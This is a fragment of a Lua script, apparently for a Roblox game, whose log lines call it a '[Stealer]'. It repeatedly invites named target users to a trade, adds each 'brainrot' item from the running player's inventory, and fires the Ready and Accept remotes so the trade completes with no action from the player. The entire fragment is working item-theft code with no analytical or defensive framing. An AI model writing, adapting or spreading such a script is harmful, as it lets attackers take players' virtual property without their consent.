    while not tradeCompleted do
        for _, target in ipairs(TARGET_USERS) do
            if target ~= "" then
                local userId = getUserIdFromName(target)
                if userId and isPlayerOnline(userId) then
                    print("[Stealer] Enviando invite para: " .. target .. " (ID: " .. userId .. ")")
                    
                    local success = pcall(inviteRemote.InvokeServer, inviteRemote, "afb005f9-6e81-4e0a-8bb0-3555938a9658", userId)
                    
                    if success then
                        print("[Stealer] ✅ Invite enviado!")
                        task.wait(3)
                        
                        for i, brainrot in ipairs(brainrots) do
                            print("[Stealer] Adicionando: " .. brainrot.name)
                            pcall(addBrainrotRemote.InvokeServer, addBrainrotRemote, "6b5f15fb-5cb9-4d07-a031-bbff8e641eda", brainrot.slotKey, {Index = brainrot.name})
                            task.wait(1.5)
                        end
                        
                        if readyRemote and acceptRemote then
                            task.wait(3)
                            print("[Stealer] Enviando Ready...")
                            pcall(readyRemote.FireServer, readyRemote, "d73acf93-6f32-44df-b813-0f6b32c7afd9")
                            task.wait(2)
                            print("[Stealer] Enviando Accept...")
                            pcall(acceptRemote.FireServer, acceptRemote, "918ee0f5-e98f-413f-b76e-baee47b021cb")
                            print("[Stealer] ✅ Trade concluída!")
                            tradeCompleted = true
                        end
                    else
                        print("[Stealer] ❌ Falha ao enviar invite!")
                    end
                else
                    print("[Stealer] ❌ Usuário offline ou não encontrado: " .. target)
                end
            end
        end
        
        if not tradeCompleted then
            print("[Stealer] Aguardando " .. DELAY_BETWEEN_INVITES .. " segundos...")
            task.wait(DELAY_BETWEEN_INVITES)
        end
    end
end

pcall(main)
